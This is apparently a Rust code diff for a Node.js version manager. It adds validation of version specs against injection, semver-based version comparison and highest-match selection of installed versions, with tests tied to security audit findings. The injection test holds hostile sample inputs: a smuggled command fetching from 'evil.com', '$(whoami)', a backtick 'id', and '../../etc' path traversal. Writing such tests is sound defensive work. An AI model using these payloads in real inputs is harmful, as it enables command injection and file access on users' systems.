@@ -191,19 +191,56 @@ pub async fn fetch_index(
 	Ok(releases)
 }
 
+/// Validate a version spec string against injection attacks.
+///
+/// Allows alphanumeric characters plus semver operators and whitespace:
+/// digits, letters, `.`, `*`, `_`, `^`, `~`, `>`, `=`, `<`, `|`, `-`, ` `.
+/// Rejects empty specs, null bytes, shell metacharacters, and path traversal.
+pub fn validate_version_spec(spec: &str) -> Result<(), LpmError> {
+	if spec.is_empty() {
+		return Err(LpmError::Script(
+			"version spec must not be empty".into(),
+		));
+	}
+
+	for ch in spec.chars() {
+		if !matches!(ch,
+			'a'..='z' | 'A'..='Z' | '0'..='9'
+			| '.' | '*' | '_' | '^' | '~'
+			| '>' | '=' | '<' | '|' | '-' | ' '
+		) {
+			return Err(LpmError::Script(format!(
+				"invalid character '{}' in version spec \"{}\". \
+				 Only alphanumeric characters and semver operators (. * _ ^ ~ > = < | -) are allowed.",
+				ch, spec
+			)));
+		}
+	}
+
+	Ok(())
+}
+
 /// Resolve a version spec (e.g., "22", "22.5", "22.5.0", "lts") to an exact version.
+///
+/// Returns `None` if the spec doesn't match any release.
+/// The spec is validated before processing; invalid specs return `None` (with a warning logged).
 pub fn resolve_version(
 	releases: &[NodeRelease],
 	spec: &str,
 ) -> Option<NodeRelease> {
+	if let Err(e) = validate_version_spec(spec) {
+		tracing::warn!("invalid version spec: {e}");
+		return None;
+	}
+
 	let spec = spec.strip_prefix('v').unwrap_or(spec);
 
-	// "lts" → latest LTS
+	// "lts" -> latest LTS
 	if spec.eq_ignore_ascii_case("lts") {
 		return releases.iter().find(|r| r.lts.is_lts()).cloned();
 	}
 
-	// "latest" → latest release
+	// "latest" -> latest release
 	if spec.eq_ignore_ascii_case("latest") {
 		return releases.first().cloned();
 	}
@@ -219,7 +256,7 @@ pub fn resolve_version(
 		return Some(r.clone());
 	}
 
-	// Partial match: "22" → latest 22.x.x, "22.5" → latest 22.5.x
+	// Partial match: "22" -> latest 22.x.x, "22.5" -> latest 22.5.x
 	let prefix = format!("v{spec}.");
 	releases
 		.iter()
@@ -227,12 +264,15 @@ pub fn resolve_version(
 		.cloned()
 }
 
-/// Simple version string comparison for sorting (descending).
-fn compare_versions(a: &str, b: &str) -> std::cmp::Ordering {
-	let parse = |s: &str| -> Vec<u64> {
-		s.split('.').filter_map(|p| p.parse().ok()).collect()
-	};
-	parse(a).cmp(&parse(b))
+/// Compare two version strings using `lpm_semver::Version` for correct semver ordering.
+///
+/// Falls back to lexicographic comparison if either version fails to parse
+/// (should not happen for versions from the Node.js index or installed directories).
+pub(crate) fn compare_versions(a: &str, b: &str) -> std::cmp::Ordering {
+	match (lpm_semver::Version::parse(a), lpm_semver::Version::parse(b)) {
+		(Ok(va), Ok(vb)) => va.cmp(&vb),
+		_ => a.cmp(b),
+	}
 }
 
 /// Find the best matching installed version for a version spec.
@@ -241,31 +281,42 @@ fn compare_versions(a: &str, b: &str) -> std::cmp::Ordering {
 /// Tries in order:
 /// 1. Exact match ("22.0.0" matches "22.0.0")
 /// 2. Prefix match ("22" matches "22.22.2", "22.5" matches "22.5.1")
-/// 3. Major-version match ("22.0.0" → major "22" → matches "22.22.2")
+/// 3. Major-version match ("22.0.0" -> major "22" -> matches "22.22.2")
 ///
-/// Returns the best (highest) matching version.
+/// Always returns the **highest** matching version, regardless of input order.
 pub fn find_matching_installed(clean_spec: &str, installed: &[String]) -> Option<String> {
-	// 1. Exact match
+	// 1. Exact match -- only one version can match exactly
 	if let Some(v) = installed.iter().find(|v| v.as_str() == clean_spec) {
 		return Some(v.clone());
 	}
 
 	// 2. Prefix match (e.g., "22" matches "22.22.2")
+	//    Collect all matches and return the highest.
 	let prefix = format!("{clean_spec}.");
-	if let Some(v) = installed.iter().find(|v| v.starts_with(&prefix)) {
-		return Some(v.clone());
+	let mut matches: Vec<&String> = installed
+		.iter()
+		.filter(|v| v.starts_with(&prefix))
+		.collect();
+
+	if !matches.is_empty() {
+		matches.sort_by(|a, b| compare_versions(b, a)); // descending
+		return Some(matches[0].clone());
 	}
 
 	// 3. Major-version fallback for full semver specs like "22.0.0" from ">=22.0.0"
 	//    Extract major and match any installed version with that major.
 	if let Some(major) = clean_spec.split('.').next() {
 		if major != clean_spec {
-			// Only do this if clean_spec has dots (i.e., is more than just a major)
 			let major_prefix = format!("{major}.");
-			return installed
+			let mut major_matches: Vec<&String> = installed
 				.iter()
-				.find(|v| v.as_str() == major || v.starts_with(&major_prefix))
-				.cloned();
+				.filter(|v| v.as_str() == major || v.starts_with(&major_prefix))
+				.collect();
+
+			if !major_matches.is_empty() {
+				major_matches.sort_by(|a, b| compare_versions(b, a)); // descending
+				return Some(major_matches[0].clone());
+			}
 		}
 	}
 
@@ -418,5 +469,54 @@ mod tests {
 		let p = Platform { os: "darwin", arch: "arm64" };
 		let url = r.download_url(&p);
 		assert_eq!(url, "https://nodejs.org/dist/v22.5.0/node-v22.5.0-darwin-arm64.tar.gz");
+	}
+
+	// Finding #5: Version spec validation
+	#[test]
+	fn validate_version_spec_valid() {
+		assert!(validate_version_spec("22").is_ok());
+		assert!(validate_version_spec("22.5.0").is_ok());
+		assert!(validate_version_spec("lts").is_ok());
+		assert!(validate_version_spec("latest").is_ok());
+		assert!(validate_version_spec(">=22.0.0").is_ok());
+		assert!(validate_version_spec("^20").is_ok());
+		assert!(validate_version_spec("~18.0.0").is_ok());
+		assert!(validate_version_spec(">=20.0.0 <22.0.0").is_ok());
+		assert!(validate_version_spec("20.0.0 || 22.0.0").is_ok());
+	}
+
+	#[test]
+	fn validate_version_spec_injection() {
+		assert!(validate_version_spec("22; wget evil.com").is_err());
+		assert!(validate_version_spec("../../etc").is_err());
+		assert!(validate_version_spec("").is_err());
+		assert!(validate_version_spec("22\0bad").is_err());
+		assert!(validate_version_spec("$(whoami)").is_err());
+		assert!(validate_version_spec("22`id`").is_err());
+	}
+
+	// Finding #7: find_matching_installed must return highest, not first
+	#[test]
+	fn find_matching_installed_returns_highest_not_first() {
+		let installed = vec![
+			"22.1.0".to_string(),
+			"22.5.0".to_string(),
+			"22.3.0".to_string(),
+		];
+		// Must return 22.5.0 (highest), not 22.1.0 (first)
+		assert_eq!(
+			find_matching_installed("22", &installed),
+			Some("22.5.0".into())
+		);
+	}
+
+	// Finding #15: compare_versions using lpm_semver
+	#[test]
+	fn compare_versions_correctness() {
+		use std::cmp::Ordering;
+		assert_eq!(compare_versions("22.5.0", "22.4.1"), Ordering::Greater);
+		assert_eq!(compare_versions("22.4.1", "22.5.0"), Ordering::Less);
+		assert_eq!(compare_versions("22.5.0", "22.5.0"), Ordering::Equal);
+		assert_eq!(compare_versions("20.18.0", "22.5.0"), Ordering::Less);
 	}
 }
